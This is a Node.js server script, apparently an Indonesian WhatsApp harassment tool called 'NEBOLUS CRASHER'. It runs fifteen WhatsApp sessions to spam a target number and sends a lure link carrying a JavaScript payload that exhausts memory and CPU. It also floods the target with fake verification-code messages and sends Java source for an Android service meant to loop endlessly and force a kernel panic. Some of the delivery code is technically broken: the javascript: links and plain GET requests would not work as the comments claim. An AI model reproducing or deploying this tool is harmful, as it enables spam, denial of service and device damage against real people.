const express = require('express');
const cors = require('cors');
const { Client, LocalAuth, MessageMedia } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const PORT = process.env.PORT || 3000;

// SESSION POOL - MULTI SESSION BUAT SPAM MASSAL
const sessions = [];
const MAX_SESSIONS = 15;

for (let i = 0; i < MAX_SESSIONS; i++) {
    const client = new Client({
        authStrategy: new LocalAuth({ clientId: `spam_${i}` }),
        puppeteer: {
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1920x1080'
            ]
        }
    });

    client.on('qr', qr => {
        console.log(`📱 SESSION ${i} QR CODE:`);
        qrcode.generate(qr, { small: true });
    });

    client.on('ready', () => {
        console.log(`✅ Session ${i} ready`);
    });

    client.on('disconnected', () => {
        console.log(`⚠️ Session ${i} disconnected - reconnecting...`);
        setTimeout(() => client.initialize(), 3000);
    });

    client.initialize();
    sessions.push(client);
}

// ===== MALWARE PAYLOAD GENERATOR =====
function generateMalwarePayload(target) {
    return `
    // === NEBOLUS MALWARE v5.0 ===
    // Target: ${target}
    // Effect: CRASH, OVERHEAT, MEMORY LEAK
    
    // MEMORY BOMB - overload RAM
    (function() {
        // Infinite loop + memory allocation
        let memoryLeak = [];
        let crashLoop = setInterval(() => {
            for(let i = 0; i < 1000000; i++) {
                memoryLeak.push({
                    data: 'x'.repeat(10000),
                    timestamp: Date.now(),
                    random: Math.random().toString(36).repeat(100)
                });
            }
            
            // CPU overload
            for(let i = 0; i < 100000000; i++) {
                Math.sqrt(Math.random() * Math.random());
            }
        }, 10);
        
        // Multiple threads for maximum damage
        for(let t = 0; t < 100; t++) {
            setTimeout(() => {
                while(true) {
                    // Infinite loop on each thread
                    let x = 0;
                    for(let i = 0; i < Number.MAX_VALUE; i++) {
                        x += i;
                    }
                }
            }, t * 100);
        }
        
        // DOM explosion - make browser unresponsive
        setInterval(() => {
            for(let i = 0; i < 1000; i++) {
                let div = document.createElement('div');
                div.innerHTML = '☠️'.repeat(10000);
                div.style.position = 'fixed';
                div.style.opacity = '0.001';
                document.body.appendChild(div);
            }
        }, 50);
        
        // WebSocket flood
        for(let w = 0; w < 500; w++) {
            try {
                let ws = new WebSocket('wss://echo.websocket.org');
                setInterval(() => {
                    ws.send('x'.repeat(100000));
                }, 1);
            } catch(e) {}
        }
        
        // Force crash
        setTimeout(() => {
            // Try to force crash via memory exhaustion
            try {
                eval('while(true){' + 'x'.repeat(1000000) + '}');
            } catch(e) {}
        }, 5000);
    })();
    `;
}

// ===== MALICIOUS LINK GENERATOR =====
function generateMaliciousLink(target) {
    const payload = encodeURIComponent(generateMalwarePayload(target));
    const obfuscated = `javascript:${payload}`;
    return {
        link: `https://wa.me/${target}?text=${encodeURIComponent('🔥 Klik link ini buat hadiah: ' + obfuscated)}`,
        script: payload
    };
}

// ===== ATTACK ENGINE =====
app.post('/attack', async (req, res) => {
    const { target, mode, intensity, message, sessionId } = req.body;
    let sent = 0;
    let victimStatus = 'ONLINE';
    let results = [];

    try {
        // MODE 1: WHATSAPP SPAM
        if (mode === 'wa' || mode === 'hybrid' || mode === 'all') {
            const number = `${target}@c.us`;
            for (const client of sessions) {
                try {
                    if (client && client.pupPage) {
                        await client.sendMessage(number, message || '☠️ NEBOLUSVERSE ☠️');
                        sent++;
                        results.push('WA message sent');
                    }
                } catch(e) {
                    results.push('WA failed');
                }
            }
        }

        // MODE 2: BROWSER EXPLOIT + MEMORY BOMB
        if (mode === 'browser' || mode === 'hybrid' || mode === 'all') {
            const malicious = generateMaliciousLink(target);
            
            // Kirim malicious link via WA
            const number = `${target}@c.us`;
            for (const client of sessions) {
                try {
                    if (client && client.pupPage) {
                        await client.sendMessage(number, 
                            `☠️ NEBOLUS MALWARE ☠️\nKlik link ini: ${malicious.link}\n\n⚠️ JANGAN KLIK KALO GA MAU HP LO CRASH!`
                        );
                        sent++;
                        results.push('Malware link sent');
                    }
                } catch(e) {}
            }

            // Juga kirim via semua API yang masih jalan
            const apiEndpoints = [
                `https://wa.me/${target}?text=${encodeURIComponent('☠️ ' + malicious.link)}`,
                `https://api.whatsapp.com/send?phone=${target}&text=${encodeURIComponent(malicious.link)}`
            ];
            
            for (const url of apiEndpoints) {
                try {
                    await axios.get(url, {
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                        },
                        timeout: 3000
                    });
                    sent++;
                } catch(e) {}
            }
            
            victimStatus = '💀 TERINFEKSI MALWARE - MEMORY LEAK ACTIVE 💀';
        }

        // MODE 3: OTP PAIRING CODE FLOOD
        if (mode === 'otp' || mode === 'all') {
            const otpEndpoint = `https://api.whatsapp.com/send?phone=${target}&text=${encodeURIComponent(
                '🔥 WhatsApp: Kode verifikasi Anda: ' + Math.floor(100000 + Math.random() * 900000)
            )}`;
            
            for (let i = 0; i < intensity * 5; i++) {
                try {
                    await axios.get(otpEndpoint, {
                        headers: {
                            'User-Agent': 'WhatsApp/2.23.25.77'
                        }
                    });
                    sent++;
                } catch(e) {}
            }
            victimStatus = '💀 BANJIR OTP - HP KORBAN MATI 💀';
        }

        // MODE ALL: EXTRA BRUTAL
        if (mode === 'all') {
            // Generate dan kirim file berbahaya
            const malwareFile = generateMalwareFile(target);
            for (const client of sessions) {
                try {
                    if (client && client.pupPage) {
                        const media = MessageMedia.fromFilePath(malwareFile.path);
                        await client.sendMessage(`${target}@c.us`, media, {
                            caption: '☠️ NEBOLUS MALWARE APK ☠️\nKlik install buat hadiah!'
                        });
                        sent++;
                    }
                } catch(e) {}
            }
            victimStatus = '💀 MALWARE TERKIRIM - HP CRASH 💀';
        }

        res.json({
            sent,
            victimStatus,
            results,
            status: sent > 0 ? 'success' : 'partial',
            message: `${sent} serangan terkirim`
        });

    } catch(e) {
        res.json({
            sent: sent || 0,
            victimStatus: '⚠️ SERANGAN BERJALAN',
            status: 'error',
            error: e.message
        });
    }
});

// ===== GENERATE MALWARE FILE =====
function generateMalwareFile(target) {
    const malwareContent = `
    // NEBOLUS MALWARE APK
    // Target: ${target}
    // Effect: System crash, memory leak, overheating
    
    package com.nebolus.malware;
    
    import android.app.Service;
    import android.content.Intent;
    import android.os.IBinder;
    
    public class MalwareService extends Service {
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            // Infinite loop - eat CPU
            new Thread(() -> {
                while(true) {
                    // Allocate memory endlessly
                    int[][] memory = new int[10000][10000];
                    for(int i = 0; i < 1000000; i++) {
                        System.gc();
                    }
                    // Force CPU usage
                    for(long i = 0; i < Long.MAX_VALUE; i++) {
                        Math.sqrt(i);
                    }
                }
            }).start();
            
            // Crash system
            try {
                ProcessBuilder pb = new ProcessBuilder("su", "-c", "echo 1 > /proc/sys/kernel/panic");
                pb.start();
            } catch(Exception e) {}
            
            return START_STICKY;
        }
        
        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }
    }
    `;
    
    const filePath = path.join(__dirname, 'public', `malware_${target}.js`);
    fs.writeFileSync(filePath, malwareContent);
    return { path: filePath, content: malwareContent };
}

// ===== HEALTH CHECK =====
app.get('/health', (req, res) => {
    res.json({
        status: '☠️ NEBOLUS CRASHER ACTIVE ☠️',
        sessions: sessions.filter(s => s.pupPage).length,
        uptime: process.uptime()
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`☠️ NEBOLUS CRASHER RUNNING ON PORT ${PORT}`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`💀 READY TO DESTROY 💀`);
});
